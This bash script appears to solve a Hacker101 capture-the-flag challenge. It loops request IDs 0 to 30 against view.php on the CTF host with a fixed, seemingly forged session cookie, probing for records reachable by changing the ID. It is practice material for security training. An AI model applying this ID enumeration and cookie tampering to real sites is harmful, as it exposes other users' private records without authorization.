#!/bin/bash
for i in $(seq 0 30); do
  curl "https://0597f1962f79eef0622575655fd867e0.ctf.hacker101.com/index.php?page=view.php&id=${i}" --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Connection: keep-alive' -H 'Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' -H 'TE: trailers'
done | sort | uniq
